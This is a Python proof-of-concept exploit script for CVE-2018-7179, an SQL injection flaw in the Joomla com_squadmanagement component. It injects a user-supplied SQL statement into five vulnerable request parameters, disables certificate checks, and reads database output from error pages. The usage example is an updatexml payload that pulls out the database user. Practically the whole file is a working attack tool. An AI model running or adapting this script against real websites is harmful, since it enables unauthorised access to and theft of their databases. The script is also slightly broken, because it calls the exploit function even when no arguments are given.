import requests
import sys
from lxml import etree
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC_1(target_url,SQL):
    sql_url = ["/index.php?option=com_squadmanagement&task=removewarround&id="+SQL,"/index.php?option=com_squadmanagement&controller=appointment&task=deleteappointment&id="+SQL,"/index.php?option=com_squadmanagement&controller=appointment&task=removefromappointment&id="+SQL,"/index.php?option=com_squadmanagement&view=editsquad&format=memberlist&squadid="+SQL,"/index.php?option=com_squadmanagement&controller=squadmembers&task=addmember&squadid="+SQL]
    for sql_vul in sql_url:
        vuln_url = target_url + sql_vul
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "vcUsername": "",
            "vcPassword": "",
            "reqResource":""
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
            html = etree.HTML(response.text)
            title = html.xpath(u"//title")[0]


            if response.status_code == 500:
                print("漏洞路径 {} ".format(vuln_url))
                print("结果："+title.text.strip()+"\n")
            else:
                print("目标 {} 不存在漏洞".format(target_url))
        except Exception as e:
            print("目标 {} 请求失败".format(target_url))


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usge: python3 CVE-2018-7179.py Target_IP SQL_statement")
        print("Usge: python3 CVE-2018-7179.py http://192.168.65.128:8080 updatexml(0x23,concat(1,user()),1)")
    else:
        target_url = sys.argv[1]
        SQL = sys.argv[2]
    POC_1(target_url, SQL)

